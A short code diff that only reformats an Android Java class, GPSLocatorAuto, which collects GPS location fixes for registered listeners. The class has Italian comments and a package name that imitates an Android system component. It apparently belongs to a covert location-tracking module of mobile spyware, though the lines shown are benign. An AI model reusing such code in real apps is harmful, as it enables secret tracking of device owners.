@@ -1,8 +1,5 @@
 package com.android.syssetup.module.position;
 
-import java.util.ArrayList;
-import java.util.List;
-
 import android.location.Location;
 import android.location.LocationListener;
 import android.os.Bundle;
@@ -11,6 +8,9 @@ import android.os.Handler;
 import com.android.syssetup.Status;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.util.Check;
+
+import java.util.ArrayList;
+import java.util.List;
 
 public class GPSLocatorAuto implements LocationListener, Runnable {
 
@@ -55,7 +55,7 @@ public class GPSLocatorAuto implements LocationListener, Runnable {
 	 * termine del quale il GPSLocator viene chiuso. se ha una posizione valida
 	 * la restituisce via callback senno' aggiunge il richiedente alla lista,
 	 * che verra' svuotata al primo fix.
-	 * 
+	 *
 	 * @param listener
 	 */
 	public boolean start(GPSLocationListener listener) {
@@ -162,7 +162,9 @@ public class GPSLocatorAuto implements LocationListener, Runnable {
 		}
 	}
 
-	/** executed by handler postDelayed, 5 minutes after the last start */
+	/**
+	 * executed by handler postDelayed, 5 minutes after the last start
+	 */
 	public void run() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (run) passed without start: " + stopDelay);
